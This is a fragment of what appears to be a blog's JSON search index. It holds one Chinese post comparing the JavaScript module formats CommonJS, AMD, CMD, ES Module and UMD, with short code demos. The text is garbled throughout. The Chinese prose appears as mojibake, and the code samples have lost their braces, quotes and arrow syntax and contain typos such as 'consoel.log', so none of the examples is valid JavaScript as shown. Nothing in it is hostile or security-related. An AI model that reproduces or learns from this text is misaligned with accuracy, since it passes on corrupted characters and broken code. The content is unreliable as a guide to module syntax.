ã€‚"},{"title":"Javascript æ¨¡å—ç®¡ç†","path":"/2020/08/29/d906451e51cd/","content":"CommonJSCommonJSæ˜¯Node.jså¯¹æ¨¡å—å¼€å‘çš„æ ‡å‡†è§„èŒƒã€‚ CommonJS moduleåŸºæœ¬è¦æ±‚å¦‚ä¸‹ï¼š ä¸€ä¸ªæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œæ‹¥æœ‰å•ç‹¬çš„ä½œç”¨åŸŸ æ™®é€šæ–¹å¼å®šä¹‰çš„ å˜é‡ã€å‡½æ•°ã€å¯¹è±¡éƒ½å±äºè¯¥æ¨¡å—å†… é€šè¿‡ require æ¥åŠ è½½æ¨¡å— é€šè¿‡ exports å’Œ module.exports æ¥æš´éœ²æ¨¡å—ä¸­çš„å†…å®¹ demo1: // module.jsmodule.exports = name: zhang, getName: function() console.log(this.name); , changeName: function(n) this.name = n; ;// index.jsconst module = require(./module/index);console.log(module)\t// name: zhang, getName: Æ’, changeName: Æ’ commons demo2: // module1.jsconst getParam = () = console.log(a);;let a = 123;let b = 456;exports.a = a;exports.b = b;exports.getParam = getParam;// index.jsconst module1 = require(./module/index1);consoel.log(module1, commons1)\t// a: 123, b: 456, getParam: Æ’ commons1 demo3: // module2.jslet a = 123;const getSome = () = console.log(yyy);;const getA = () = console.log(a);;exports.getSome = getSome;module.exports = getA;// index.jsconst module2 = require(./module/index2);consoel.log(module2, commons2)\t// function getA() ... æ€»ç»“ ï¼š é€šè¿‡è¿™æ ·çš„ä¸€ä¸ªå¯¹æ¯”çš„ä¾‹å­å°±å¯ä»¥æ¯”è¾ƒæ¸…æ™°çš„å¯¹æ¯”å‡º exports å’Œ module.exports çš„åŒºåˆ«:1ã€å½“ exports å’Œ module.exports åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œmodule.exports ä¼šç›–è¿‡ exports2ã€å½“æ¨¡å—å†…éƒ¨å…¨éƒ¨æ˜¯ exports çš„æ—¶å€™ï¼Œ å°±ç­‰åŒäº module.exports3ã€æœ€å æˆ‘ä»¬å°±å¯ä»¥è®¤å®šä¸º exports å…¶å®å°±æ˜¯ module.exports çš„å­é›†ã€‚ AMDAMDå…¨ç§°ä¸ºå¼‚æ­¥æ¨¡å—å®šä¹‰, æ˜¯ä¸“é—¨ä¸ºæµè§ˆå™¨ä¸­JavaScriptç¯å¢ƒè®¾è®¡çš„è§„èŒƒã€‚ AMDè®¾è®¡å‡ºä¸€ä¸ªç®€æ´çš„å†™æ¨¡å—APIï¼š define(id?, dependencies?, factory); å…¶ä¸­ï¼š id: æ¨¡å—æ ‡è¯†ï¼Œå¯ä»¥çœç•¥ã€‚ dependencies: æ‰€ä¾èµ–çš„æ¨¡å—ï¼Œå¯ä»¥çœç•¥ã€‚ factory: æ¨¡å—çš„å®ç°ï¼Œæˆ–è€…ä¸€ä¸ªJavaScriptå¯¹è±¡ã€‚å¦‚æœä¸ºå‡½æ•°ï¼Œå®ƒåº”è¯¥åªè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœæ˜¯å¯¹è±¡ï¼Œæ­¤å¯¹è±¡åº”è¯¥ä¸ºæ¨¡å—çš„è¾“å‡ºå€¼ã€‚ ä½¿ç”¨RequireJSçš„requireå‡½æ•°åŠ è½½æ¨¡å—: require([dependencies], callback); dependencies: è¡¨ç¤ºæ‰€ä¾èµ–çš„æ¨¡å— callback: ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå½“å‰é¢æŒ‡å®šçš„æ¨¡å—éƒ½åŠ è½½æˆåŠŸåï¼Œå®ƒå°†è¢«è°ƒç”¨ã€‚åŠ è½½çš„æ¨¡å—ä¼šä»¥å‚æ•°å½¢å¼ä¼ å…¥è¯¥å‡½æ•°ï¼Œä»è€Œåœ¨å›è°ƒå‡½æ•°å†…éƒ¨å°±å¯ä»¥ä½¿ç”¨è¿™äº›æ¨¡å— base.js define(function() return mix: function(source, target) ;); ui.js define([base], function(base) return show: function() // todo with module base ); page.js define([data, ui], function(data, ui) // init here) data.js define( users: [], members: []); ä»¥ä¸ŠåŒæ—¶æ¼”ç¤ºäº†defineçš„ä¸‰ç§ç”¨æ³• å®šä¹‰æ— ä¾èµ–çš„æ¨¡å—ï¼ˆbase.jsï¼‰ å®šä¹‰æœ‰ä¾èµ–çš„æ¨¡å—ï¼ˆui.jsï¼Œpage.jsï¼‰ å®šä¹‰æ•°æ®å¯¹è±¡æ¨¡å—ï¼ˆdata.jsï¼‰ CMDAMDå¼€å§‹ä¸ºæ‘†è„±CommonJSçš„æŸç¼šï¼Œå¼€åˆ›æ€§çš„æå‡ºäº†è‡ªå·±çš„æ¨¡å—é£æ ¼ã€‚ä½†åæ¥åˆåšäº†å¦¥åï¼Œå…¼å®¹äº† CommonJS ModulesWrappings ã€‚æ‰€ä»¥å°±æœ‰äº†CMD, å®ƒçš„è¯­æ³•å¦‚ä¸‹: define(id?, dependencies?, factory); å› ä¸ºCMDæ¨å´‡ä¸€ä¸ªæ–‡ä»¶ä¸€ä¸ªæ¨¡å—ï¼Œæ‰€ä»¥ç»å¸¸å°±ç”¨æ–‡ä»¶åä½œä¸ºæ¨¡å—idï¼› CMDæ¨å´‡ä¾èµ–å°±è¿‘ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸åœ¨defineçš„å‚æ•°ä¸­å†™ä¾èµ–ï¼Œè€Œæ˜¯åœ¨factoryä¸­å†™ã€‚ factoryæœ‰ä¸‰ä¸ªå‚æ•°ï¼š function(require, exports, module) require: require æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œæ¥å— æ¨¡å—æ ‡è¯† ä½œä¸ºå”¯ä¸€å‚æ•°ï¼Œç”¨æ¥è·å–å…¶ä»–æ¨¡å—æä¾›çš„æ¥å£ï¼› exports: exports æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨æ¥å‘å¤–æä¾›æ¨¡å—æ¥å£ï¼› module: module æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸Šé¢å­˜å‚¨äº†ä¸å½“å‰æ¨¡å—ç›¸å…³è”çš„ä¸€äº›å±æ€§å’Œæ–¹æ³•ã€‚ demo: define(function(require, exports, module) var base = require(base); exports.show = function() // todo with module base ); AMDæ¨å´‡ä¾èµ–å‰ç½®ï¼Œåœ¨å®šä¹‰æ¨¡å—çš„æ—¶å€™å°±è¦å£°æ˜å…¶ä¾èµ–çš„æ¨¡å—. CMDæ¨å´‡å°±è¿‘ä¾èµ–ï¼Œåªæœ‰åœ¨ç”¨åˆ°æŸä¸ªæ¨¡å—çš„æ—¶å€™å†å»require. AMDå’ŒCMDæœ€å¤§çš„åŒºåˆ«æ˜¯å¯¹ä¾èµ–æ¨¡å—çš„æ‰§è¡Œæ—¶æœºå¤„ç†ä¸åŒï¼Œæ³¨æ„ä¸æ˜¯åŠ è½½çš„æ—¶æœºæˆ–è€…æ–¹å¼ä¸åŒå¾ˆå¤šäººè¯´requireJSæ˜¯å¼‚æ­¥åŠ è½½æ¨¡å—ï¼ŒSeaJSæ˜¯åŒæ­¥åŠ è½½æ¨¡å—ï¼Œè¿™ä¹ˆç†è§£å®é™…ä¸Šæ˜¯ä¸å‡†ç¡®çš„ï¼Œå…¶å®åŠ è½½æ¨¡å—éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œåªä¸è¿‡AMDä¾èµ–å‰ç½®ï¼Œjså¯ä»¥æ–¹ä¾¿çŸ¥é“ä¾èµ–æ¨¡å—æ˜¯è°ï¼Œç«‹å³åŠ è½½ï¼Œè€ŒCMDå°±è¿‘ä¾èµ–ï¼Œéœ€è¦ä½¿ç”¨æŠŠæ¨¡å—å˜ä¸ºå­—ç¬¦ä¸²è§£æä¸€éæ‰çŸ¥é“ä¾èµ–äº†é‚£äº›æ¨¡å—ï¼Œè¿™ä¹Ÿæ˜¯å¾ˆå¤šäººè¯Ÿç—…CMDçš„ä¸€ç‚¹ï¼Œç‰ºç‰²æ€§èƒ½æ¥å¸¦æ¥å¼€å‘çš„ä¾¿åˆ©æ€§ï¼Œå®é™…ä¸Šè§£ææ¨¡å—ç”¨çš„æ—¶é—´çŸ­åˆ°å¯ä»¥å¿½ç•¥ã€‚ ES Moduleåœ¨ ES2015 æ ‡å‡†ä¸ºå‡ºæ¥ä¹‹å‰ï¼Œæœ€ä¸»è¦çš„æ˜¯CommonJSå’ŒAMDè§„èŒƒã€‚ä¸Šæ–‡ä¸­æˆ‘ä»¬å·²ç»ä»‹ç»äº† CommonJS è§„èŒƒï¼ˆä¸»è¦æ˜¯ä¸ºäº†æœåŠ¡ç«¯ NodeJS æœåŠ¡ï¼‰å’Œ AMDï¼ˆä¸»è¦å¼•ç”¨åœ¨æµè§ˆå™¨ç«¯ï¼‰ï¼Œé‚£ä¹ˆå½“ ES6æ ‡å‡†çš„å‡ºç°ï¼Œä¸ºæµè§ˆå™¨ç«¯æ¨¡å—åŒ–åšäº†ä¸€ä¸ªéå¸¸å¥½çš„è¡¥å……ã€‚ exportç”¨äºå¯¹å¤–è¾“å‡ºæœ¬æ¨¡å—ï¼ˆä¸€ä¸ªæ–‡ä»¶å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ¨¡å—ï¼‰å˜é‡çš„æ¥å£importç”¨äºå¯¼å…¥exportå¯¼å‡ºçš„æ¨¡å— // index.jsexport const fn1 = function () console.log(fn1)export const fn2 = function () console.log(fn2)const fn = fn1, fn2export default fn// index1.jsimport fn1, fn2 from index.jsfn1() // fn1fn2() // fn2 import fn from index.jsconsole.log(fn) // fn1: Æ’, fn2: Æ’ export å¯ä»¥å¯¼å‡ºçš„æ˜¯ä¸€ä¸ªå¯¹è±¡ä¸­åŒ…å«çš„å¤šä¸ª å±æ€§ï¼Œæ–¹æ³•ã€‚ export default åªèƒ½å¯¼å‡º ä¸€ä¸ª å¯ä»¥ä¸å…·åçš„ å¯¹è±¡ã€‚ import fn from ./xxx/xxx ( export å¯¼å‡ºæ–¹å¼çš„ å¼•ç”¨æ–¹å¼ ) import fn from ./xxx/xxx1 ( export default å¯¼å‡ºæ–¹å¼çš„ å¼•ç”¨æ–¹å¼ ) UMDAMDä»¥æµè§ˆå™¨ä¸ºç¬¬ä¸€ï¼ˆbrowser-firstï¼‰çš„åŸåˆ™å‘å±•ï¼Œé€‰æ‹©å¼‚æ­¥åŠ è½½æ¨¡å—ã€‚å®ƒçš„æ¨¡å—æ”¯æŒå¯¹è±¡ï¼ˆobjectsï¼‰ã€å‡½æ•°ï¼ˆfunctionsï¼‰ã€æ„é€ å™¨ï¼ˆconstructorsï¼‰ã€å­—ç¬¦ä¸²ï¼ˆstringsï¼‰ã€JSONç­‰å„ç§ç±»å‹çš„æ¨¡å—ã€‚å› æ­¤åœ¨æµè§ˆå™¨ä¸­å®ƒéå¸¸çµæ´»ã€‚ CommonJS moduleä»¥æœåŠ¡å™¨ç«¯ä¸ºç¬¬ä¸€ï¼ˆserver-firstï¼‰çš„åŸåˆ™å‘å±•ï¼Œé€‰æ‹©åŒæ­¥åŠ è½½æ¨¡å—ã€‚å®ƒçš„æ¨¡å—æ˜¯æ— éœ€åŒ…è£…çš„ï¼ˆunwrapped modulesï¼‰ä¸”è´´è¿‘äºES.nextHarmonyçš„æ¨¡å—æ ¼å¼ã€‚ä½†å®ƒä»…æ”¯æŒå¯¹è±¡ç±»å‹ï¼ˆobjectsï¼‰æ¨¡å—ã€‚ è¿™è¿«ä½¿ä¸€äº›äººåˆæƒ³å‡ºå¦ä¸€ä¸ªæ›´é€šç”¨æ ¼å¼ UMD(Universal Module Definition)ã€‚å¸Œæœ›æä¾›ä¸€ä¸ªå‰åç«¯è·¨å¹³å°çš„è§£å†³æ–¹æ¡ˆã€‚ UMDçš„å®ç°å¾ˆç®€å•ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦æ”¯æŒNode.jsæ¨¡å—æ ¼å¼ï¼ˆexportsæ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå­˜åœ¨åˆ™ä½¿ç”¨Node.jsæ¨¡å—æ ¼å¼ã€‚ å†åˆ¤æ–­æ˜¯å¦æ”¯æŒAMDï¼ˆdefineæ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå­˜åœ¨åˆ™ä½¿ç”¨AMDæ–¹å¼åŠ è½½æ¨¡å—ã€‚å‰ä¸¤ä¸ªéƒ½ä¸å­˜åœ¨ï¼Œåˆ™å°†æ¨¡å—å…¬å¼€åˆ°å…¨å±€ï¼ˆwindowæˆ–globalï¼‰ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ (function (root, factory) if(typeof exports === object typeof module === object) module.exports = factory(); else if(typeof define === function define.amd) define([], factory); else if(typeof exports === object) exports[nav] = factory(); else root[nav] = factory();)(window, this, function() // module return addEvent: function(el, type, handle) //... , removeEvent: function(el, type, handle) , ;)"}]